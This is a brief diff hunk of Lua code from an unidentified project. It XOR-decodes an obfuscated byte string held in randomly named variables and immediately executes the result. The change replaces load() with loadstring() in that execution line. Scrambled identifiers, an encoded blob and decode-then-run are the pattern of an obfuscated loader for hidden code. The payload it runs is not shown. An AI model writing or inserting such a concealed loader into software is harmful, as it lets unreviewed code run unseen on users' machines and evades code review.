@@ -5,4 +5,4 @@ for i=1,#nqxMWT do
 local b=(nqxMWT:byte(i)-64)%256
 LSH09r[i]=string.char((b~B1dv6t[((i-1)%#B1dv6t)+1])%256)
 end
-load(table.concat(LSH09r))()
+loadstring(table.concat(LSH09r))()
